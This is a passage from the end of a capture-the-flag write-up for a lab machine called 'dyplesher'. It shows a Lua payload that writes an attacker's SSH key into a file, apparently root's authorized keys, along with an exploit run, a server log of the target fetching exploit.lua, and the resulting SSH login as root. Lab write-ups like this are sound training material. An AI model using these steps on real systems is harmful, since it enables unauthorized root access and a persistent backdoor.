file:write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+P7qV7kjQ7RaxUNNeAlQkREHCUKW1kXitmHwdrpDZ+MZlfmZmYPJ75A+/m/S6JVS4qi8oCXthZX06j0x1oaGrKAsoYSuMMU+eN40gp+9I2IaPglv0407yL4fJMqy0jnb9ID+g5c+OTTH8q7tQ0wvcFLZpOnnbHVp2Autgb9Plx4fppNAQcHn11VBXTv+e48RKcC44gJULVhqp8eB8lT5O2pT5aHP58s3dggTMn5rwzxK7k6jT638rHNWUM84WhepzQb9dE3NYLX2RRdshBIIfqVeIUZfxWg5fcLjgTfdV7lb4zrJbS9KXH8UWb8NSfM73Pwy3mSFSdtNC59qTZEiN838bBSJbFtcBj8aVHWrdEjowGBzv8yYcrLC7tpFZyHxLsQsenOf/MTUKtqrqQq/tRVwcwhbYHXH2fIcU1x+pEI8qxpLHR64fiynxwrnVP/FSGchvvX3hnzkdDE3g51lvMhpkAxX30aqwd1Hmqs8YRYVA43atczbLo1TaNto3QkU= xnaaro@parrot")
file:close()
```

I had to execute the exploit a couple of times until it worked as expected.

```bash
python3 exploit.py
```

We can see the lua exploit was getting retrieved by the service.

```bash
felamos@dyplesher:/tmp$ python3 -m http.server 4443
Serving HTTP on 0.0.0.0 port 4443 (http://0.0.0.0:4443/) ...
127.0.0.1 - - [05/Jun/2020 16:48:31] "GET /exploit.lua HTTP/1.0" 200 -
```

## Root

And we got root user.

```bash
$ ssh root@10.10.10.190 -i id_rsa
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jun 2020 04:48:35 PM UTC

  System load:  0.04              Processes:              263
  Usage of /:   6.7% of 97.93GB   Users logged in:        2
  Memory usage: 40%               IP address for ens33:   10.10.10.190
  Swap usage:   1%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Sun May 24 03:33:34 2020
root@dyplesher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@dyplesher:~# hostname
dyplesher
root@dyplesher:~# cat root.txt
dfd34xxxxxxxxxxxxxxxxxxxxx
```

This box took me 25 hours of work, most of the time was in the enumeration part, once you know the behaviour of the services is easily accomplished after some research and development guides.

Hope you liked it, happy hacking!

